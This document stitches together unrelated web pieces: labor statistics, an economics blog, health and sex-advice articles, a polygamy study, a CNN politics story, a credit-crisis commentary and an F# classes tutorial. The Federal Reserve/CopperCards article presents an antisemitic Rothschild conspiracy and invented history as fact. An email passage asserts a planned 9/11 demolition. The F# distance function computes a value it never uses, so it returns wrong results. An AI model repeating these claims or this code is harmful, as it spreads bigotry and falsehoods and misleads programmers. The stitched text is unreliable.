If you want to put away more and crush your savings goals sooner , there ’s one great way to do it : Earning more money .
That ’s why my team and I have worked hard to create a guide to help you earn more today :

Before taking a look at the monthly jobs data , let 's take a look at weekly claims .
The US Department of Labor is reporting Initial Unemployment Insurance Claims continue to rise .
Seasonally Adjusted
In the week ending June 28 , the advance figure for seasonally adjusted initial claims was 404,000 , an increase of 16,000 from the previous week 's revised figure of 388,000 .
The 4 - week moving average was 390,500 , an increase of 11,250 from the previous week 's revised average of 379,250 .
Unadjusted
The advance number of actual initial claims under state programs , unadjusted , totaled 368,876 in the week ending June 28 , an increase of 10,503 from the previous week .
There were 300,348 initial claims in the comparable week in 2007 .
Jobs Decline 6th Consecutive Months
Nonfarm payroll employment continued to trend down in June ( - 62,000 ) , while the unemployment rate held at 5.5 percent , the Bureau of Labor Statistics of the U.S. Department of Labor reported today .
Employment continued to fall in construction , manufacturing , and employment services , while health care and mining added jobs .
Average hourly earnings rose by 6 cents , or 0.3 percent , over the month .
Establishment Data
Highlights
43,000 construction jobs were lost
33,000 manufacturing jobs were lost
8,000 retail trade jobs were lost
51,000 professional and business services jobs were lost
7,000 service providing jobs were added
24,000 leisure and hospitality jobs were added
29,000 government jobs were added
Birth / Death Model From Alternate Universe
BLS Black Box
The net birth / death model component figures are unique to each month and exhibit a seasonal pattern that can result in negative adjustments in some months .
These models do not attempt to correct for any other potential error sources in the CES estimates such as sampling error or design limitations .
Note that the net birth / death figures are not seasonally adjusted , and are applied to not seasonally adjusted monthly employment links to determine the final estimate .
The most significant potential drawback to this or any model - based approach is that time series modeling assumes a predictable continuation of historical patterns and relationships and therefore is likely to have some difficulty producing reliable estimates at economic turning points or during periods when there are sudden changes in trend .

Rothbard on Big Business
6 August 2008 at 9:09 am Peter G. Klein
| Peter Klein |
We at O&M are sometimes described as “ pro-business . ”
But this is not correct .
We strongly support the economic function of commerce , and we think private ownership of capital , the profit - seeking activities of entrepreneurs and managers , and unfettered markets for consumer goods , factors of production , and financial assets are essential to a strong economy .
But that does n’t mean we admire the behavior and character of every capitalist , entrepreneur , and manager .
Indeed , plenty are scoundrels .
Empirically , the businesspeople who rise to the top in today ’s mixed economy , with its peculiar blend of free markets and state controls , are likely to be those who excel in political entrepreneurship , in “ working the system ” to their advantage .
Murray Rothbard summarizes this view in a private letter written in 1966 :
For some time I have come to the conclusion that the grave deficiency in the current output and thinking of our libertarians and “ classical liberals ” is an enormous blind spot when it comes to big business .
There is a tendency to worship Big Business per se .
. . and a corollary tendency to fail to realize that while big business would indeed merit praise if they won that bigness on the purely free market , that in the contemporary world of total neo-mercantilism and what is essentially a neo - fascist “ corporate state , ” bigness is a priori highly suspect , because Big Business most likely got that way through an intricate and decisive network of subsidies , privileges , and direct and indirect grants of monopoly protection .
Rothbard refers his correspondent to Gabriel Kolko , William Appleman Williams , James Weinstein , C. Wright Mills , and other New Left critics of the corporate state for details .
For more on Rothbard ’s own views see “ Left and Right : The Prospects for Liberty ” ( 1965 ) and “ Confessions of a Right - Wing Liberal ” ( 1968 ) , as well as related essays by Joseph Stromberg and Roy Childs .

WASHINGTON ( Reuters ) -
Two hugely popular supplements used to fight arthritis and joint pain , glucosamine and chondroitin sulfate , do not seem to work any better than placebo to slow the loss of knee cartilage in osteoarthritis , researchers reported on Monday .
But the researchers said some of their findings were confusing and said more study was needed .
“ At two years , no treatment showed what we determined to be a clinically important reduction in joint space width loss , ” said Dr. Allen Sawitzke of the University of Utah School of Medicine , who helped lead the study .
The study , funded by the National Center for Complementary and Alternative Medicine at the National Institutes of Health , confirms other findings showing the supplements have few or no effects .
The trial is called glucosamine / chondroitin arthritis intervention trial or GAIT .
Writing in the October issue of Arthritis & Rheumatism , Sawitzke and colleagues said they had trouble interpreting their results because patients who took placebos had a smaller loss of cartilage than they should have .
The original GAIT study results in 2006 found the supplements did not reduce the pain of knee arthritis , except among a small group of patients with moderate to severe pain .
The GAIT researchers continued to watch 572 volunteers for another 18 months and found the supplements did not appear to slow the loss of cartilage , taken either alone or together .
They said arthritis worsened in 24 percent of participants taking both , similar to those taking placebo .
“ Research continues to reveal that osteoarthritis , the most common form of arthritis , appears to be the result of an array of factors including age , gender , genetics , obesity , and joint injuries , ” said Dr. Stephen Katz , director of the NIH ’s National Institute of Arthritis and Musculoskeletal and Skin Diseases .
“ Because osteoarthritis affects nearly 21 million Americans , we are seeking ways to not only treat pain , but also address the structural effects of the condition , ” he said .
Since the dynamics within straight relationships have shifted relatively recently , we 're kinda confused about how we 're supposed to behave , particularly when it comes to gender roles .
After we posted about this week 's episode of Mad Men - in which Don Draper has a sexually charged dominance scene with one woman - and reading the comment thread , it became clear that some people are just as uncomfortable with women being sexually submissive as people once felt about women being sexually dominant .
But maybe we should look to gay men for our cues .
There 's something sort of admirable about gay male couples .
Not that they 're out and proud - I mean , that 's great , obviously - but that there 's an acceptance about the fluidity of the roles each person is allowed to play in a relationship and an innate understanding about sexual expectations that does n't always exist in heterosexual coupling .
Maybe it 's the fact that they are so used to not being the " norm " that they do n't give a fuck about conforming to what 's expected of " men . "
Either way , I think we could stand to learn a thing or two from them .
5. ) Anal Is Optional
Some gay men I know who are in their mid to late 20s have never had anal sex and do n't really ever want to .
Maybe they just have n't met that special guy to lose their anal virginity to , or maybe they are correct in the assessment that it just is n't for them .
( I would n't know about pitching , but catching can hurt like a motherfucker . )
Other gay guys I know only have anal sex with someone
They 're really close to .
In this day and age where porn is so pervasive , people feel required to be a little more adventurous ( which can be a good thing ! ) , but just because you 're open to trying new things , does n't mean that your asshole is .
And forcing the issue can lead to rectal bleeding .
4 . ) Sex Can Be Expected Or A Given
For the most part , when gay men go on a date , or hook up with someone they 've met on the internet or whatever , both parties assume ( and hope ) that the end result of the evening will be sex .
I totally get this .
Particularly because , personally , I would never be alone with a man unless I 'd already decided that I wanted to fuck him , and also because I do n't see the point in holding in my farts around someone all night long unless I got something out of it .
Camille Paglia has said that " one of the costs of modern feminism is that women must be like gay men who understand that every date is a sexual encounter , " adding that the way for women to be safe in our sexual relationships is to acknowledge and accept that it 's dangerous territory , and to be equipped to deal with all that that entails .
She 's said , " Everyone in the gay male world knows that the price of sexual adventure can be death , so I am tired of young women regarding themselves as a special class that somehow wants a perfect experience . "
3 . ) Stay Friendly With Former Lovers
Every gay guy I have ever met stays friendly with at least some of his former hookups .
Sometimes they become really close friends .
Sometimes the old flames ( heh ) set them up with other guys they 'd slept with , acknowledging that they are much better suited for each other .
Sometimes they have sex with their ex-BF 's ex-BFs .
It 's called " six degrees of Kevin 's bacon . "
This might just be a New York thing , I dunno .
But it 's kind of a good idea .
I say , yes , stay friendly with past hookups - and eliminate any jealous feelings - especially if they 're hot or really genuine , because birds of a feather and all that .
They might be able to set you up with someone else that you can actually date long term .
2 . ) Dominant / Submissive Roles
With most gay couples there is a top and there is a bottom .
But there is a give - and - take aspect to pretty much all sexual relationships across the board .
In straight relationships , there seems to be this embarrassment for " progressive " people about a man taking the dominant role and a woman taking the submissive role .
It 's like the parties involved are afraid they 'll set the women 's movement back 50 years if a girl 's hair gets pulled , or if her ass gets smacked , or if she 's told what to do in bed .
As long it 's between consenting adults , no one should feel bad about what turns them on .
Gay men do n't have this problem of dividing the sexual power play .
1 . ) Resolving Our Sexual Selves With the Rest of Our Lives Identifying as gay means that your sex life helps defines who you are way more than it does for straight people .
Perhaps having it so out there is why it 's so much easier for gay men to embrace their sexuality while also embracing other facets of their lives , like for example , domesticity .
Maybe it 's part of the whole virgin / whore thing , but people find it weird when hyper - sexual women are also into things like , say , homemaking .
It 's totally accepted that gay men can be equally psyched about going to Bed , Bath , & Beyond and sniffing out a sale on pillows and matching damasks , and going to bed and having marathon sex ( maybe in a threesome ? ) .
But people still have this stereotype in their minds of what a woman who enjoys filthy sex should be like .
We should all accept that women , too , are multi-faceted creatures who might be into sucking a dick one night , and tatting a doily another ; nailing a picture to the wall one night , or getting nailed against a wall another .

Want to live a little longer ?
Get a second wife .
New research suggests that men from polygamous cultures outlive those from monogamous ones .
After accounting for socioeconomic differences , men aged over 60 from 140 countries that practice polygamy to varying degrees lived on average 12 % longer than men from 49 mostly monogamous nations , says Virpi Lummaa , an ecologist at the University of Sheffield , UK .
Lummaa presented her findings last week at the International Society for Behavioral Ecology ’s annual meeting in Ithaca , New York .
Rather than a call to polygamy , the research might solve a long - standing puzzle in human biology :
Why do men live so long ?
Advertisement
This question only makes sense after asking the same for women , who – unlike nearly all other animals – live long past the menopause .
Enforced monogamy
One answer seems to be a phenomenon called the grandmother effect .
For every 10 years a woman survives past the menopause , she gains two additional grandchildren , Lummaa says .
It seems that doting on and spoiling grandchildren aids their survival , as well as furthering some of their grandmother ’s genes .
Men , by contrast , can reproduce well into their 60s and even 70s and 80s , and most researchers assumed this explained their longevity .
But Lummaa and colleague Andy Russell wondered whether other factors explained the long lifespan of men , such as a grandfather effect .
To test this possibility , the team analysed church - gathered records for 25,000 Finns from the 18th and 19th centuries .
People tended to move little , no one practiced contraception and the Lutheran Church enforced monogamy .
Only widowed men could remarry , and if they had children with their new wife , they fathered more kids , on average , than men who married once .
But ultimately remarried men “ do n’t end up with any more grandchildren , ” Lummaa says .
“ If anything the presence of a grandfather was associated with decreased survival of grandchildren . ”
Perhaps , Lummaa adds , the children of the first mother lose out on food and resources that go to the second mother ’s kids .
“ It ’s kind of the Cinderella effect . ”
Even fathers with only one wife provided no benefit to their grandchildren , a finding supported by previous research .
Biological selection
With the grandfather effect ruled out , Lummaa and Russell next wondered whether the constraints of human physiology explain male longevity .
In the same way that men have nipples that evolved for women to nourish their young , male longevity might be a consequence of biological selection for long - lived women .
To answer this question , the researchers compared the lifespan of men from polygamous countries with those from monogamous nations .
Using data from the World Health Organization , Lummaa and Russell scored 189 countries on a monogamy scale of one to four – totally monogamous to mostly polygamous .
They also took into account a country ’s gross domestic product and average income to minimise the effect of better nutrition and healthcare in monogamous Western nations .
Lummaa stressed that their monogamy score is a crude first stab , and they are working to find multiple ways to assess marriage patterns .
The conclusions could evaporate under further analysis , she adds .
If female survival is the main explanation for male longevity , then monogamous and polygamous men would live for about the same length of time .
Instead , it seems that fathering more kids with more wives leads to increased male longevity .
Men , then , live long because they ’re fertile well into their grey years .
The explanation could be both social and genetic .
Men who continue fathering kids into their 60s and 70s could take better care for their bodies because they have mouths to feed .
But evolutionary forces acting over thousands of years could also select for longer - lived men in polygamous cultures .
“ It ’s a valid hypothesis and good prediction , ” says Chris Wilson , an evolutionary anthropologist at Cornell University in Ithaca , New York , who attended the talk .
But the care and attention of several wives who depend on the social status of their ageing husband could explain everything .
“ It does n’t surprise me that men in those societies live longer than men in monogamous societies , where they become widowed and have nobody to care for them . ”

Clive Boustred says the future can be different ; that we can get rid of the Federal Reserve Bank , displacing it with a new system that puts people in control of their money and lives
It is hard to believe , but he has the credentials to be taken seriously
Clive Boustred has an impressive resume that includes nearly twenty years of providing consulting strategy for many of the high tech companies that are creating the world in which we now live .
That experience built the corporate strategies of such companies as Sun Microsystems and Intuit .
The core of his experience is in high tech , edge banking systems .
Boustred 's solution to the problem Americans face economically is CopperCards Bank .
According to Boustred , the CopperCards Bank does not generate money , as we know it .
It does not charge you for every transaction .
It does not use fractional reserve banking .
Instead , it simply enables trade using the heretofore untapped potentials of computers , encryption , and the Internet .
We all know that if we all took our money out the bank would not have enough to meet its demands .
That is what a ' run on the bank ' means ; it is the result of fractional reserve banking .
With the bank Boustred has designed the money you put in the bank stays there , waiting for you , he says .
It does not visit anyone and is not rented out without your knowledge , as is true with the bank down the street .
Boustred explains that CopperCards Bank is not banking , as we have known it , but a system that eliminates currency as the means for conducting transactions .
People can use gold and silver coins ; anything , according to Boustred , can be traded through CopperCards Bank .
No fees are charged , loans on assets , such as your car or home , are made without charging interest at no cost to you .
Boustred 's system would eliminate the costs of making transactions .
It will sit on your desk or in your purse , waiting for when you need it .
Today , many Americans seek relief for the problems created through fractional reserve banking and the FED .
Many are looking seriously for solutions .
More people every day can tell you who owns the FED and why a solution is necessary .
At the same time , those entrusted with government , for instance Congress , continue to ignore the problem .
Which leaves Americans at a stand still .
Such solutions as that started by Bernard von NotHaus 's Liberty Dollar have proven to be problematical .
The company issued minted gold and silver currency , valued for collection and as a way to hold precious metal against inflation .
In the von NotHaus case , while tens of thousands in coin and metal were seized by the Federal government , no arrest or charges were made ; the holdings of gold and coins confiscated are being held with no explanation .
Asked if his system was legal Boustred replied that it certainly is .
Displacing a system with something better , like the car replacing the horse and buggy , annoys the blacksmiths but it is perfectly legal .
Also , there is nothing to seize .
All transactions are recorded off shore .
Interviewed for this article Boustred said , “ If not for the Federal Reserve and government Americans would have had this system as the natural extension of the computer and Internet long since . ”
Boustred then explained that we have seen the technology moving in this direction without understanding what was going on .
Citing such innovations in trading as Ebay and Craig 's List , Boustred pointed out that these are actually trading systems and since they charge small amounts are wildly profitable because of the high volume .
That makes these sites a little like today 's banks , but better than selling or trading using traditional means .
The CopperCards Bank extension of this is to see the ' bank ' just as a point for trading .
Anything can be traded .
You pay in dollars , which are traded for ' coppers ' the internal unit for marking value , to buy Swiss Francs ; your old stamp album , converted into coppers , by placing it for sale , is paid out in Euros to buy lodging in Hawaii .
Ten hours of your time spent building a rocking chair becomes coppers which instantaneously are paid out to buy transport into the Alps .
Anything , effectively , becomes money when viewed this way .
The existence of the FED and other Central banks , for instance those in Europe , have obscured where the technology could take us and what it could make available .
Boustred predicts that traditional banks will disappear , just like the horse and buggy , when CopperCards is fully on line .
All existing systems are based on loaning money you did not own , especially Fractional Reserve Banking .
The practice got its start over 200 years ago .
A gold merchant in Frankfurt , Germany , a Mr. Nathaniel Bauer , got into the habit of loaning money actually owned by his customers .
He had noticed how careless the nobility he routinely dealt with were with their gold .
In that inattention he found an opportunity .
Mr. Bauer discovered he could loan many , many times the gold in his possession .
Then , he realized the gold was not necessary .
He later changed his name to Mayer Amschel Rothschild .
The practice with loans , money , and currency became a family business , now of many generations duration .
From the family practice of marrying cousins so to preserve their capital , came the Central Banks of Europe today .
The lineage of the family illustrates the strategy , the story appearing on their own website as the Family History .
Boustred advised Americans to pay attention to what was being done to the wealth they entrust to traditional banks as he pointed out that with the high security encryption built into his system every copper in every transaction can be traced .
With America 's economy well into its downward spiral no one is sure where we will be a year from now .
Americans are looking for solutions , and Boustred 's ideas are creating a following .
The number of calls received at their office is increasing rapidly .
Most Americans are worried about money ; there is not enough to stretch and what remains is too often spent on taxes , fines , fees and costs from big corporations and government .
No one seems to know what you are supposed to actually get for the money you give them .
With oil arching up to touch $ 145 a barrel and questions on how the vast oil reserves in Alaska were taken off line , making relief from that direction unlikely to happen , even people at the check out line in the local grocery store are conscious of what is going on with the dollar and the FED .
It has been a long time since Americans worried about finding food in the stores .
Today , that worry is growing as the dollar continues its nosedive .
And each of these questions return to the issue of the Federal Reserve Bank .
The root of everything we do begins at the need to buy and sell .
For many years , the idea that there was something smoky about the FED and how fractional reserve banking worked was the sort of thing you expected to hear only from nutcases and weirdos , who ran around in tin foil hats , or economists .
But today revelations regarding the status of that institution have increased in volume until the questions are being voiced at the local Walmart .
What is the FED , who controls it , and what happened to our money ?
More are asking every day .
The present movement towards hyperinflation was predicted by John Templeton , considered by many to be the Father of Wall Street .
Templeton predicted the present collapse three years ago , also predicting that it would be unstoppable because those in charge did not have the expertise , skills , or ability to stop it .
As to who controls the FED , a cursory check does verify that it is actually twelve separate banks , each a privately and closely held corporation .
Ownership of the banks is murky , with the most likely scenario being that much of the effective control rests with Europeans .
Also easily verifiable is the fact that it came into existence via a move by Woodrow Wilson , Teddy Roosevelt , his cousin Franklin Delano Roosevelt , and a group of bankers , meeting over the Christmas Congressional break in 1913 .
The number of bankers involved , according to “ Secrets of the Federal Reserve ”
by Eustace Mullins , a highly respected historian , was limited to the participation of less than ten men .
The book goes on to raise eyebrows with quotes such as this ,
“ The Rothschilds were wary of Germany 's ability to continue in the war , despite the financial chaos caused by their agents , the Warburgs , who were financing the Kaiser , and Paul Warburg 's brother , Max , who , as head of the German Secret Service , authorized Lenin 's train to pass through the lines and execute the Bolshevik Revolution in Russia .
According to Under Secretary of the Navy , Franklin D. Roosevelt , America 's heavy industry had been preparing for war for a year .
Both the Army and Navy Departments had been purchasing war supplies in large amounts since early in 1916 . ”
Meaning that the same bankers who met with Woodrow Wilson and the Roosevelts planned the War to End all Wars , World War II and , presumably later military ventures , as a way to generate corporate income through the printing of US Treasury dollars , emptying the all too occasional surpluses into their own pockets .
Today , through the Internet , this kind of information is percolating across the entire population to be discussed , like bad weather , at Walmart .
Through other easily discovered linkages most of the ills that have plagued the world for the last century can be explained as a means to churn US Treasury dollars , paid for by American Taxpayers , into money banked by the same , small group of individuals , mostly located in Europe .
This explains the present mortgage meltdown , those funds end up in the same accounts , off shore .
What Americans need today , said Boustred , is the means to stabilize their economy , trade , do business , buy , sell , and hold on to what they own .
Money must flow , but for that to happen Americans must pry lose the fingers of those who control them through their money .
Boustred , returning to the subject of the developments in banking technology , went on to point out that when the transfer of money is electronic it is instantaneous , thus the ' float ' is eliminated , making it possible to have a system of banking and trading that is a simple but elegant service that costs nothing .
The tiny cost , Boustred said , would be nearly unnoticed and easily borne as a business expense of businesses who would be paying far less with this technology than the present fees charged to implement credit cards .
This has been true for some time now .
Boustred said , “ we can now eliminate the need for banks and fiat currency as we have known them .
Instead , this can be handled as a not - for - profit that is decoupled from government , corporate or personal interests .
CopperCards
Bank will function as a not for profit and encourages others to do the same . ”
Asked if this would change the lives of ordinary people Boustred responded with enthusiasm .
“ Yes .
Their incomes will effectively double .
They can carry out their transactions in tax free zones .
The average Joe can structure their affairs in the same way that the megawealthy do today .
This will eliminate taxes all together .
This also means that commerce will receive an enormous boost .
We can experience the greatest boom in history instead of a downward spiral into poverty . ”
The lives of ordinary people , said Boustred , will be less , not more , complicated .
“ Using CopperCards Bank we can eliminate the fluctuations and wars that have plagued us .
We can live in peace , prosperity , and community .
It will be very much better for everyone , even the Rothschilds .. ” said Boustred .
“ For instance , ” Boustred said , illustrating his point .
“ Imagine yourself selling a used car .
You list it for free .
Your local CopperCards Guardian looks it over , notes you have good credit and are in good standing .
You receive 90 % of the probably selling price immediately .
When a buyer gives you the money you get the other 10 % . ” I asked , “ No fee ? ” “ None .
Welcome to banking as it will be very soon . ”
Then he smiled .
Boustred , a native of South Africa who left there for America because he was disgusted with Apartheid , lectured on strategy for high tech companies in Silicon Valley and around the world for much of the 90s .
Boustred 's website is at CopperCards.com and the site offers cards that help “ Americans stranded in the courts . ”

From an unedited e-mail exchange with Tim McNiven , brainchild of the ' boxcutter - stewardess - throatslit " meme :
" I was not told if the discussions with the Building Engineers brought about the decision to use Explosives to bring down the Twin Towers but we did discuss that Idea .
One day Lt. Teague asked the question : What about using Explosives ?
When we looked at him like we didnot know what he was talking about he expanded the question to :
What about using Explosives to bring the Building down ?
Then we knew what he was talking about , since I had seen a tv show about this .
My answer was :
It would have to be done by someone who worked there or someone who had access to the inside of the Building .
Since I didnot have any knowledge of Explosives this is as far as their quesioning of me went but others in my Unit who knew about Explosives could have discussed it further .
Whether the Building Engineer discussions influenced their decision to discuss using Explosives to bring down the WTC Twin Towers or whether they already had that Idea the US Government did discuss in this Study using Explosives to bring the WTC Twin Towers down .
Another item we discussed is the setting up of Training Exercises to cover - up an Air Security Stand Down .
One day while discussing the current US Air Defense System ( Circa 1976 ) Sgt.
Henderson said that there was " No Way " that an airplane could inflitrate US Air Space " Unnoticed " since the Policy was to send Jets to inspect any unidentified aircraft in US Air Space .
Then Lt. Teague said ; that Our Air Space Defense could be put on Stand Down status for Training Exercises .
The way that he said this wasnot that he had just thought of it but that it was said as if it had already been decided by the DoD in advance to do this .
The effect of what he said and how he said it left us in shocked silent disbelief . "

WASHINGTON ( CNN ) -- Ralph Nader 's presidential candidacy has received little media attention , but his latest critique of Sen.
Barack Obama has come under fire for its seemingly racial overtones .
Ralph Nader is running for president as an independent .
Speaking with Colorado's Rocky Mountain News , Nader accused Obama of attempting to " talk white " and appealing to " white guilt " in his quest to win the White House .
" There 's only one thing different about Barack Obama when it comes to being a Democratic presidential candidate .
He 's half African - American , " Nader told the paper in comments published Tuesday .
" Whether that will make any difference , I do n't know .
I have n't heard him have a strong crackdown on economic exploitation in the ghettos .
Payday loans , predatory lending , asbestos , lead .
What 's keeping him from doing that ?
Is it because he wants to talk white ?
He does n't want to appear like Jesse Jackson ?
We 'll see all that play out in the next few months and if he gets elected afterwards , " Nader added .
Obama said Wednesday in Chicago , Illinois , that Nader was simply trying to " get attention . "
" What 's clear is , Ralph Nader has n't been paying attention to my speeches , " he said .
" Ralph Nader 's trying to get attention .
He 's become a perennial political candidate .
I think it 's a shame , because if you look at his legacy ... it's an extraordinary one .
...
At this point , he 's somebody who 's trying to get attention , whose campaign has n't gotten any traction . "
Watch panelists weigh in on Nader 's remarks »
Obama 's presidential campaign earlier had called Nader 's comments disappointing , and his communication 's director , Robert Gibbs , said Tuesday that they were " reprehensible and basically delusional . "
" I do n't think he 's spent a lot of time looking at the record of Barack Obama , " Gibbs said on MSNBC .
Nader is a longtime consumer advocate who was blamed by many Democrats for Al Gore 's loss in the 2000 presidential election ; they said he claimed votes that would otherwise have gone to their candidate .
He said Obama 's top issue should be poverty in America , given his racial heritage .
Watch Nader describe whom the Democrats should be " going after " »
" I mean , first of all , the number one thing that a black American politician aspiring to the presidency should be is to candidly describe the plight of the poor , especially in the inner cities and the rural areas , and have a very detailed platform about how the poor is going to be defended by the law , is going to be protected by the law and is going to be liberated by the law , " he said .
" Have n't heard a thing . "
Nader also said Obama is making a concerted effort not to be " another politically threatening African - American politician . "
" He wants to appeal to white guilt .
You appeal to white guilt not by coming on as black is beautiful , black is powerful .
Basically , he 's coming on as someone who is not going to threaten the white power structure , whether it 's corporate or whether it 's simply oligarchic .
And they love it .
Whites just eat it up . "
Nader formally entered the presidential race in the spring , expressing disappointment with both remaining Democratic candidates at that time .
" They are both enthralled to the corporate powers , " he said of both Obama and Sen. Hillary Clinton .
" They 've completely ignored the presidential pattern of illegality and accountability ; they 've ignored the out of control waste - fraud military expenditures ; they hardly ever mention the diversion of hundreds of billions of dollars to corporate subsidies , handouts and giveaways ; and they do n't talk about a living wage . "
CNN political producer Ed Hornick contributed to this report .
All About Ralph Nader • Barack Obama
One year after the beginning of the modern credit crisis , Randall Forsyth , writing in Barrons , provides an fine round - up of what caused this mess to begin with .
His theory is that the problems began when statistical modeling of mortgages replaced old - fashioned credit reports when it came to valuing mortgage loans .
" With statistical modeling , no longer was it necessary to collect and verify information about borrowers .
Put everybody in the pool and everything would even out , statistically speaking ....
From that , Wall Street made the leap to taking those loans and structuring them into securities .
Since financiers knew , with statistical certainty , how many loans in the pool would default , they sliced the loans into tranches . "
He blames the advent of modeling for creating the illusion that loans were just another form of security , and he correctly dates the beginning of the problem from " somewhere in the 1970s , " but he seems to miss the critical ingredient that made all of this possible .
The final elimination of the dollar 's tie to gold is what unleashed the illusion that we never again had to worry about whether there was enough money .
The Fed cast a spell over the financial markets that risk was a thing of the past , having been reduced to one slight factor among many that is used to assess the market price of load / securities .
The element of risk itself was considered to be separate from an actual borrower 's ability to pay and became merely an aggregated statistical construct divorced from human action .
He urges us to keep markets functioning as the best means to solve the problem but he seems to miss the critical point -- and this is not just his mistake but a near universal issue -- that an essential part of free markets is the sound money that emerges from market exchange .
The money we use has been distorted and destroyed in order to make possible a fiat money world in which scarcity and risk no longer play a role -- or at least this is what we believed .
By all means , let markets clear but the core problems will never go away until money resumes its role not as an infinitely available grease for economic expansion but as a scarce and finite good that merely facilitates sound economic development .
Two new books are crucial here .
First , there is Hayek 's amazing writing on the business cycle , which links macroeconomic phenomena to the quality of money .
Second is George Selgin 's demonstration of the historic capacity of markets alone to make and guard money .
In the past couple of posts , I covered extension everything in F# .
This allows me to extend .NET types with such things as extension static and instance methods , properties , properties with indexers , events and so on .
But , let ’s go back to the beginning and cover object oriented programming with F# from the ground up .
I like to stress that F# is not only a first class functional language , albeit a more impure one than say Haskell , but it also treats imperative and object oriented code as first class citizens as well .
To be able to mix and match for the appropriate programming style makes this a very powerful tool , to be able to use functional aspects with first class citizenship , but as well with imperative and object oriented , well , then the sky is the limit .
With that , let ’s go over some of the things that make F# a player in this space .
Let ’s get caught up to where we are so far :
Defining Classes
As I will point out several times , F# is a pretty flexible language .
With this , you will find that there are several ways of defining classes , whether it be explicit constructors , constructors in the type definition among other things .
Constructed classes in F# must follow the sytanx , with those items in the brackets being option , and the ones with the asterisk may appear zero to many times .
type TypeName optional - arguments [ as ident ] =
[ inherit type { as base } ]
[ let - binding | let – rec bindings ] *
[ do - statement ] *
[ abstract - binding | member - binding | interface - implementation ] *
From the above syntax , I can specify the inheritance , local functions and values ( let syntax ) , verify parameters with the do syntax and member properties , methods and interface implementations .
Defining a simple class is very straightforward .
Consider if I want to implement a person class and override the ToString ( ) to output some meaningful input .
The code for implementing this is compact without a lot of pomp and circumstance such as this .
type Person = { FirstName : string ; LastName : string ;
Age : int }
with override x .
ToString ( ) =
sprintf " %s %s is %d years old " x .
FirstName x .
LastName x .
Age
let p1 = { FirstName = " Matthew " ; LastName = " Podwysocki " ; Age = 31 }
printfn " %s " ( p1 .
ToString ( ) )
What ’s nice about this approach is that I can define these simple classes and once they are constructed , they are immutable by default .
Very nice for message construction and other operations .
But , if you want more behaviors inside your defined classes , then it ’s best to use a more explicit syntax as below .
Constructing Classes
Using the construction style , I can create simple value objects such as a Geocoordinate to hold a latitude and longitude as well as have the capability of calculating the distance between two instances of Geocoordinates .
type Geocoordinate ( lat : float , lon : float ) =
let PI = System .
Math .
PI
// Validate arguments
do if lon > 180 .0 | | lon < – 180 .0 then invalid_arg " lon "
do if lat > 90 .0 | | lat < – 90 .0 then invalid_arg " lat "
// Properties
member x .
Latitude with get ( ) = lat
member x .
Longitude with get ( ) = lon
// Methods
static member private DegreesToRadians ( deg ) =
deg * PI / 180 .0
static member GetDistance ( g1 : Geocoordinate , g2 : Geocoordinate ) =
let x = ( sin ( Geocoordinate .
DegreesToRadians g1 . Latitude ) *
sin ( Geocoordinate .
DegreesToRadians g2 . Latitude ) +
cos ( Geocoordinate .
DegreesToRadians g1 . Latitude ) *
cos ( Geocoordinate .
DegreesToRadians g2 . Latitude ) *
cos ( abs ( ( Geocoordinate .
DegreesToRadians g2 . Longitude ) -
( Geocoordinate .
DegreesToRadians g1 . Longitude ) ) ) )
let acos_x = atan ( sqrt ( 1 .0 – pown x 2 ) / x )
let distance = 1 .852 * 60 .0 * ( ( x / PI ) * 180 .0 )
distance
In the above class , I specified the default constructor to take in a lat and lon .
From there , I can use the do syntax to validate the parameters .
I expose the lat and lon parameters also as Latitude and Longitude member properties .
And then I specified a static instance method that calculates the distance between two instances of Geocoordinate classes .
Alternatively , I could specify the constructors manually instead of during the initial type definition by using the new keyword to define my constructors as well such as the following .
type Geocoordinate =
val lat : float
val lon : float
new ( lat : float , lon : float ) = { lat = lat ; lon = lon ; }
// Properties
member x .
Latitude with get ( ) = x .
lat
member x .
Longitude with get ( ) = x .
lon
// Rest Ommitted
The first example is the preferred way as you can be more flexible while using the do and let syntax , whereas this above solution does not allow for this .
Instead , I would only focus on this style of constructor for structs only .
But the flexibility here gives you some latitude in terms of your particular coding style .
Code Reuse Through Modules
Another particularly powerful feature is the ability for code reuse by importing modules .
For example , had some of those functions been implemented in an external module , then I can easily reuse them by opening them .
In the above example , the DegreesToRadians and GetDistance functions could have been defined externally such as this .
module GeospatialModule =
let PI = System .
Math .
PI
let degrees_to_radians deg =
deg * PI / 180 .0
let calculate_distance lat1 lon1 lat2 lon2 =
let x = ( sin ( degrees_to_radians lat1 ) *
sin ( degrees_to_radians lat2 ) +
cos ( degrees_to_radians lat1 ) *
cos ( degrees_to_radians lat2 ) *
cos ( abs ( ( degrees_to_radians lon2 ) –
( degrees_to_radians lon1 ) ) ) )
let acos_x = atan ( sqrt ( 1 .0 – pown x 2 ) / x )
let distance = 1 .852 * 60 .0 * ( ( x / PI ) * 180 .0 )
distance
And then I could implement the class in a much more concise format while using these defined functions .
open GeospatialModule GeospatialModule type Geocoordinate ( lat : float , lon:float ) =
// Validate arguments
do if lon > 180.0 || lon < – 180.0 then invalid_arg " lon "
do if lat > 90.0 || lat < – 90.0 then invalid_arg " lat "
// Properties
member x.Latitude with get ( ) = lat
member x.Longitude with get ( ) = lon
// Methods
static member GetDistance ( g1 : Geocoordinate , g2:Geocoordinate ) =
calculate_distance g1.Latitude g1.Longitude
g2.Latitude g2.Longitude
The code as written is much more compact than before as I have refactored my code to use functions from modules and cut down on the clutter inside my code .
Optional and Named Arguments
In F# , you ’ll find that the OOP constructs that F# supports are very much oriented towards API designers .
As such , there is a need to permit designers to specify named arguments and allow for the fact that some arguments are optional .
Named arguments are simply when creating an object , specify the name before the assignment operator such as the example below .
Using this style makes reading object initialization much more readable as you are not relying on argument position , instead by given name .
let g1 = new Geocoordinate ( lat = 12 .0 , lon = 34 .0 )
An optional parameter can be specified during the declaration by prefixing the argument name with a question mark ( ? ) .
This becomes translated to an Option < ‘ a > type which allows for either some value or no value at all .
Should the value not be specified , you can set the default argument value through the let syntax .
Let ’s walk through a simple example of a simple class called TextBoxInfo .
type TextBoxInfo ( ? text : string , ?color : Color , ? font : Font ) =
// Initialize
let text = defaultArg text " "
let color = match color with
| None ->
Color .
Red
| Some c -> c
let font = match font with
| None -> new Font ( FontFamily .
GenericSerif , 10 .0 f )
| Some f -> f
// Properties
member x .
Text = text
member x .
Color = color
member x .
Font = font
I specified default values for each should they not have been specified .
This allows me to specify only the arguments I need to do my operation .
Some examples of how to create a TextBox Info are below .
let tb1 = new TextBoxInfo ( " Hello textbox " )
let tb2 = new TextBoxInfo ( text = " Hello textbox " ,
color = Color .
Aqua )
